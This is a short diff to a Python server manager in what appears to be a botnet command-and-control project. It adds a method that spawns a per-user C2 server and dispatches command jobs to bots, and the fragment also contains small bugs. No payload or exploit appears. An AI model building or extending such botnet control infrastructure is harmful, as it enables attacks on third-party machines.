@@ -4,6 +4,8 @@ import sys
 import json
 import pyodbc
 
+import c2_pb2
+
 import command
 import c2server
 from botnet_exceptions import *
@@ -18,7 +20,21 @@ class ServerManager():
         self.c2servers = []
         self.connection_string = self.get_connection_string("botnet")
 
-    def get_connection_string(database):
+    def start_job(self, request):
+        c2server = self.does_c2server_exist(self, request.userId)
+
+        if c2server is None:
+            c2server = self.spawn_c2server(request.userId)
+        
+        try:
+            c2server.start_job(request.commandId)
+        except NoBotsException:
+            return c2_pb2.StartJobResponse.Response.FAIL
+        else:
+            return c2_pb2.StartJobResponse.Response.SUCCESS
+
+
+    def get_connection_string(self, database):
         f = open("databaseconfig.json", r)
         config = json.load(f)
 
